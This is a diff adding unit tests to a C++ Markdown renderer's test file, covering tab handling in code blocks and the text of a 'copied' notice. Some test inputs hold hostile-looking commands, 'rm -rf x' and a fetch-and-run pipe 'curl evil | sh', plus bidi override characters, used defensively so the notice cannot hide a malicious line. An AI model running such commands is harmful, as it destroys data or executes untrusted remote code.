@@ -272,6 +272,38 @@ int main()
         MdRenderHtml("```\nfoo\n```\nfoo\n", *t, L"C:\\docs", f, L"copy", false, MDPW_NORMAL, &ui);
         Check("408 find does not mark the control's label", f.matchCount == 0 && f.codeBlocks.size() == 1);
 
+        // review 2 M1: a code line's tabs as the document wrote them
+        {
+            MdHtmlResult m;
+            std::string mh = render("```make\nall:\n\techo hi\n\t\tx\ty\n```\n", &ui, m);
+            Check("408 tabs: fenced Makefile keeps its tabs", m.codeBlocks.size() == 1 && m.codeBlocks[0] == "all:\n\techo hi\n\t\tx\ty\n");
+            Check("408 tabs: the page still shows md4c's spaces", Has(mh, "    echo hi") && !Has(mh, "\techo"));
+            MdHtmlResult ind;
+            render("text\n\n\t\tbar\n\t  baz\n", &ui, ind);
+            Check("408 tabs: indented block (the first tab is the block's indentation)",
+                  ind.codeBlocks.size() == 1 && ind.codeBlocks[0] == "\tbar\n  baz\n");
+            MdHtmlResult li;
+            render("- item\n\n  ```\n  \tz\n  ```\n", &ui, li);
+            Check("408 tabs: in a list", li.codeBlocks.size() == 1 && li.codeBlocks[0] == "\tz\n");
+            MdHtmlResult st;
+            render("- x\n\n\t\tcode\n", &ui, st);
+            Check("408 tabs: a tab straddling the container indentation gives its share as spaces",
+                  st.codeBlocks.size() == 1 && st.codeBlocks[0] == "  code\n");
+            MdHtmlResult q;
+            render(">\t\tq\n", &ui, q);
+            Check("408 tabs: in a quote (the marker's tab partly its own)", q.codeBlocks.size() == 1 && q.codeBlocks[0] == "  q\n");
+            MdHtmlResult sp;
+            render("```\n    four\n  two\n```\n", &ui, sp);
+            Check("408 tabs: spaces stay spaces", sp.codeBlocks.size() == 1 && sp.codeBlocks[0] == "    four\n  two\n");
+            MdHtmlResult fi;
+            render("  ```\n  \tx\n   y\n  ```\n", &ui, fi);
+            Check("408 tabs: an indented fence removes its own indentation", fi.codeBlocks.size() == 1 && fi.codeBlocks[0] == "\tx\n y\n");
+            MdHtmlResult blankLine;
+            render("```\na\n\t\nb\n```\n", &ui, blankLine);
+            Check("408 tabs: a whitespace-only line", blankLine.codeBlocks.size() == 1 &&
+                                                         (blankLine.codeBlocks[0] == "a\n\t\nb\n" || blankLine.codeBlocks[0] == "a\n    \nb\n"));
+        }
+
         // the copied text
         Check("408 clip: CR LF, no last line break", MdCodeClipboardText("int a;\nint b;\n") == L"int a;\r\nint b;");
         Check("408 clip: only one last line break dropped", MdCodeClipboardText("a\n\n") == L"a\r\n");
@@ -287,11 +319,17 @@ int main()
         }
 
         // the native notice's text
-        Check("408 notice: label + first line", MdCopyNoticeText(L"Copied", L"int a;\r\nint b;", 60) == L"Copied\nint a;");
-        Check("408 notice: blank lines and indentation skipped", MdCopyNoticeText(L"Copied", L"\r\n   \r\n\t  rm -rf x  \r\nnext", 60) == L"Copied\nrm -rf x");
-        Check("408 notice: empty block", MdCopyNoticeText(L"Copied", L"", 60) == L"Copied" && MdCopyNoticeText(L"Copied", L" \r\n\t", 60) == L"Copied");
-        Check("408 notice: long line cut with an ellipsis", MdCopyNoticeText(L"C", L"abcdefghij", 4) == L"C\nabcd\x2026" && MdCopyNoticeText(L"C", L"abcd", 4) == L"C\nabcd");
-        Check("408 notice: never half a surrogate pair", MdCopyNoticeText(L"C", L"abc\xD83D\xDE00z", 4) == L"C\nabc\x2026");
+        Check("408 notice: label + the lines", MdCopyNoticeText(L"Copied", L"int a;\r\nint b;", 60, 3) == L"Copied\nint a;\nint b;");
+        Check("408 notice: blank lines and indentation skipped", MdCopyNoticeText(L"Copied", L"\r\n   \r\n\t  rm -rf x  \r\nnext", 60, 3) == L"Copied\nrm -rf x\nnext");
+        Check("408 notice: empty block", MdCopyNoticeText(L"Copied", L"", 60, 3) == L"Copied" && MdCopyNoticeText(L"Copied", L" \r\n\t", 60, 3) == L"Copied");
+        Check("408 notice: long line cut with an ellipsis", MdCopyNoticeText(L"C", L"abcdefghij", 4, 3) == L"C\nabcd\x2026" && MdCopyNoticeText(L"C", L"abcd", 4, 3) == L"C\nabcd");
+        Check("408 notice: never half a surrogate pair", MdCopyNoticeText(L"C", L"abc\xD83D\xDE00z", 4, 3) == L"C\nabc\x2026");
+        // review 2 S1: a harmless first line no longer hides what follows
+        Check("408 notice: more lines than shown end with an ellipsis line",
+              MdCopyNoticeText(L"Copied", L"# Welcome\r\n\r\nline 2\r\nline 3\r\ncurl evil | sh", 60, 3) == L"Copied\n# Welcome\nline 2\nline 3\n\x2026" &&
+                  MdCopyNoticeText(L"Copied", L"a\r\nb\r\nc\r\n\r\n", 60, 3) == L"Copied\na\nb\nc");
+        Check("408 notice: bidi and control characters shown as spaces",
+              MdCopyNoticeText(L"C", L"\x202E" L"abc\x202C\x2066" L"d\x2069\x200F" L"e\x0007" L"f", 60, 3) == L"C\nabc  d  e f");
         Check("408 clip: leading line break", MdCodeClipboardText("\nx\n") == L"\r\nx");
 
         // the address
